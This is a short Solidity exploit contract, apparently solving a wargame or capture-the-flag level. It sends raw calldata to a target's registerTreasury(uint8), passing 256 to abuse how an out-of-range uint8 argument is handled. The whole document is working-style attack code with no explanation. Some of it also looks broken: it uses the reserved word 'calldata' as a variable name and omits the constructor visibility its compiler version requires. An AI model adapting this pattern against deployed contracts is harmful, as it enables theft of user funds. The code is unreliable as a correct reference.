pragma solidity ^0.6.12;

contract HigherOrderExploit {
    address private immutable instance;

    // Correct function selector for registerTreasury(uint8) is 0xab3bfe6a
    function attack() external {
        bytes4 selector = 0xab3bfe6a;
        bytes32 uint256Data = 0x0000000000000000000000000000000000000000000000000000000000000100;
        
        bytes memory calldata = abi.encodePacked(selector, uint256Data);
        (bool success, ) = instance.call(calldata);
        require(success, "Attack failed");
    }

    constructor(address _instance) {
        instance = _instance;
    }
}